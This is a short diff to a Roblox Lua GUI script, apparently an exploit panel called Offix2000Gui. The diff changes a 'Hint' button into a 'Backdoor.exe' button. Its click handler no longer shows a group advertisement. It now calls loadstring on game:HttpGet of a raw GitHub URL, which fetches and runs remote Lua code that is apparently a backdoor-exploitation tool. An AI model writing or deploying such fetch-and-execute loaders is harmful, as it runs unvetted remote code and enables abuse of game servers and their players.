@@ -15,11 +15,11 @@ Frame.BackgroundColor3 = Color3.new(1,1,1)
 HintButton.Parent = Offix2000Gui
 HintButton.Size = UDim2.new(0,165,0,50)
 HintButton.Position = UDim2.new(0.008,0,0.441,0)
-HintButton.Text = "Hint"
+HintButton.Text = "Backdoor.exe"
 HintButton.TextScaled = true
 HintButton.BackgroundColor3 = Color3.new(0,1,0)
 HintButton.MouseButton1Click:Connect(function()
-    Instance.new("Hint" ,game.Workspace).Text = "Team Offix2000 Join Today https://www.roblox.com/groups/35029464/Team-Offix2000-Join-Today#!/about"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))()
 end)
 AdminButton.Parent = Offix2000Gui
 AdminButton.Size = UDim2.new(0,137,0,50)
